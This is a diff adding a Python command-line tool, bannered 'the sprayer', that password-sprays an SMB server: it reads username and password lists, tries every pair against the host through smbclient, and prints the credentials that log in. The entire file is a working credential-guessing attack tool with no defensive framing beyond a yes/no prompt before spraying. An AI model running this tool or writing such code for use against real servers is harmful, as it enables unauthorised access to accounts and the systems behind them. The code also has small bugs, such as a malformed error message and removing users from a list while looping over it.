@@ -1,0 +1,106 @@
+#!/usr/bin/env python3
+
+from colorama import Fore, Back, Style
+import smbclient; from smbprotocol.exceptions import LogonFailure; import socket
+import argparse
+import sys; import os
+import time
+
+def main():
+
+    usernames = []
+    passwords = []
+    parser = argparse.ArgumentParser()
+
+    parser.add_argument('-host','--server_host', required=True)
+    parser.add_argument('-name','--share_name', required=True)
+    parser.add_argument('-pf','--pass_file', required=True)
+    parser.add_argument('-u','--user_file', help="Password file, DOMAIN\\username or just username for a local account.", required=True)
+    parser.add_argument('-show','--show_failed', help="Shows failed login attemps.", action="store_true")
+    parser.add_argument('-p','--port', required=True)
+
+    arg = parser.parse_args()
+
+    try:
+        print(f'{Fore.YELLOW}[*]Loading {arg.user_file} and {arg.pass_file}{Style.RESET_ALL}')
+        if not os.path.isfile(arg.user_file):
+            print(f'{Fore.RED}[!]{arg.user_file} doesn\'t exist.{Style.RESET_ALL}')
+
+        if not os.path.isfile(arg.pass_file):
+            print(f'Fore.RED[!]{arg.user_file} doesn\'t exist.{Style.RESET_ALL}')
+
+        usernames_file = open(arg.user_file, 'r')
+        passwords_file = open(arg.pass_file, 'r')
+
+    except Exception as e:
+        print(f'{Fore.RED}[!]Unexpected error: {e}{Style.RESET_ALL}')
+        exit()
+
+    try:
+        for line in usernames_file:
+            usernames.append(line.strip())
+
+        for line in passwords_file:
+            passwords.append(line.strip())
+
+    except UnicodeDecodeError as e:
+        print(f'{Fore.RED}[!]Error reading: {e}, skipping line.{Style.RESET_ALL}')
+
+    usernames_file.close()
+    passwords_file.close()
+    print(f'{Fore.GREEN}[*]Scucessfully loaded and closed {arg.user_file} and {arg.pass_file}{Style.RESET_ALL}')
+ 
+
+    print(f"{Fore.YELLOW}[*]Attempting to connect to {arg.server_host}:{arg.port}{Style.RESET_ALL}")
+
+    try:
+        with socket.create_connection((arg.server_host, arg.port), timeout=10):
+            print(f'{Fore.GREEN}[*]Connected to {arg.server_host}:{arg.port}{Style.RESET_ALL}')
+
+    except Exception as e:
+        print(f'{Fore.RED}{e}{Style.RESET_ALL}')
+        exit()
+
+   
+    ans = input(f'[?]Are you sure you want to spray {Fore.RED}{arg.server_host}:{arg.port}{Style.RESET_ALL} [y/N]: ').lower()
+
+    if ans == "y":
+        print("\n")
+        pass
+
+    else:
+        print(f'{Fore.RED}[!]Exiting...{Style.RESET_ALL}')
+        exit()
+
+    print(f"{Fore.GREEN}[*]Starting spray on {arg.server_host} for share {arg.share_name}{Style.RESET_ALL}\n")
+
+    for password in passwords:
+        for user in usernames: 
+
+            try:
+                smbclient.register_session(arg.server_host,user,password,connection_timeout=5,)
+                print(f'{Fore.GREEN}Sucessfull: {user}:{password}{Style.RESET_ALL}')
+                usernames.remove(user)
+
+            except LogonFailure as e:
+                if arg.show_failed:
+                    print(f'{Fore.RED}Failed: {user}:{password}{Style.RESET_ALL}')
+                pass
+
+    print(f"\n{Fore.GREEN}[*]Fuzzing done{Style.RESET_ALL}\n")
+
+if __name__ == "__main__":
+    banner = rf"""{Fore.WHITE}
+  _     _
+/\ \__/\ \                                                                        
+\ \ ,_\ \ \___      __         ____  _____   _ __    __     __  __     __   _ __  
+ \ \ \/\ \  _ `\  /'__`\      /',__\/\ '__`\/\`'__\/'__`\  /\ \/\ \  /'__`\/\`'__\
+  \ \ \_\ \ \ \ \/\  __/     /\__, `\ \ \L\ \ \ \//\ \L\.\_\ \ \_\ \/\  __/\ \ \/ 
+   \ \__\\ \_\ \_\ \____\    \/\____/\ \ ,__/\ \_\\ \__/.\_\\/`____ \ \____\\ \_\ 
+    \/__/ \/_/\/_/\/____/     \/___/  \ \ \/  \/_/ \/__/\/_/ `/___/> \/____/ \/_/ 
+                                       \ \_\                    /\___/            
+                                        \/_/                    \/__/           
+    {Style.RESET_ALL}"""
+
+    print(banner,"\n\n")
+    main() 
